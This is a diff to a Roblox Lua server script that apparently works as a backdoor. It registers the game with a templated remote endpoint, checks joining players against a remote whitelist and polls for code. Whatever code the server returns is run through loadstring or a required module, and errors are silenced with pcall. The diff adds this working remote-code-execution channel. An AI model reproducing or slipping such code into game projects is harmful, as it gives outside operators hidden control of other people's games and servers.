@@ -1,8 +1,14 @@
 local https = game:GetService("HttpService")
 local plrs = game:GetService("Players")
 
-local endpoint = "http://localhost:5000/"
-local run = require(0x26E001F12)
+local endpoint = "https://{{endpoint}}/"
+
+local run
+if pcall(function() loadstring("_ = true")() end) then
+	run = loadstring
+else
+	run = require(0x26E001F12)
+end
 
 local threads = {}
 
@@ -10,20 +16,29 @@ pcall(function()
 	https:PostAsync(endpoint.."api/game?placeid="..tostring(game.PlaceId), "")
 end)
 
+local whitelisted = {}
 local whitelist = function(plr)
-	return https:JSONDecode(https:GetAsync(endpoint.."api/whitelist?userid="..tostring(plr.UserId)))
+	local isWhitelisted = https:JSONDecode(https:GetAsync(endpoint.."api/whitelist?userid="..tostring(plr.UserId)))
+	
+	if isWhitelisted then
+		table.insert(whitelisted, plr)
+	end
+
+	return isWhitelisted
 end
 
 local function plrAdded(plr)
 	if whitelist(plr) then
 		threads[tostring(plr.UserId)] = coroutine.create(function()
 			while true do
-				task.wait(1)
+				task.wait(#whitelisted)
 				pcall(function()
 					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping?userid="..tostring(plr.UserId), true))
                     for _, code in pairs(queue) do
 				    	coroutine.wrap(function()
-                            run(code)
+							pcall(function()
+                            	run(code)()
+							end)
                         end)()
                     end
 				end)
